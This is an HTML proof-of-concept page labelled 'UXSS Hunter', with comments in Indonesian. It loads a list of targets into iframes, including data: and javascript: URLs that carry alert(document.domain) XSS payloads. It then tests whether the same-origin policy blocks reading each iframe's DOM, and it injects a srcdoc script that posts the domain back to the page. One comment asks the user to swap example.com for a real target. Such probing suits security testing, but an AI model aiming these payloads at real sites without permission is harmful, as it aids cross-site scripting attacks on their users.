<!DOCTYPE html>
<html>
<head>
  <title>UXSS Hunter</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; }
    iframe { width: 400px; height: 200px; border: 1px solid #555; margin: 5px; }
    .log { white-space: pre; }
  </style>
</head>
<body>
  <h2>üïµÔ∏è UXSS Hunter PoC</h2>
  <div class="log" id="log"></div>

  <script>
    function log(msg) {
      document.getElementById("log").textContent += msg + "\n";
      console.log(msg);
    }

    // Target list buat fuzz
    const targets = [
      "https://example.com",             // ganti ke target asli
      "about:blank",
      "data:text/html,<script>alert(document.domain)</script>",
      "javascript:alert(document.domain)"
    ];

    // Coba load target dalam iframe
    targets.forEach(url => {
      try {
        let f = document.createElement("iframe");
        f.src = url;
        document.body.appendChild(f);

        log("Loaded: " + url);

        // Coba akses contentWindow (harusnya diblok Same-Origin Policy)
        setTimeout(() => {
          try {
            let dom = f.contentWindow.document;
            log("‚ùó [Possible UXSS] bisa akses DOM iframe: " + url + " ‚Üí domain: " + dom.domain);
          } catch(e) {
            log("‚úÖ [Isolated] ga bisa akses iframe: " + url);
          }
        }, 2000);

      } catch(e) {
        log("Error load: " + url + " ‚Üí " + e);
      }
    });

    // Tes srcdoc injection
    let s = document.createElement("iframe");
    s.srcdoc = "<script>parent.postMessage('[srcdoc executed] domain='+document.domain,'*')</script>";
    document.body.appendChild(s);

    window.addEventListener("message", (e) => {
      log("üì© Message dari iframe: " + e.data);
    });
  </script>
</body>
</html>
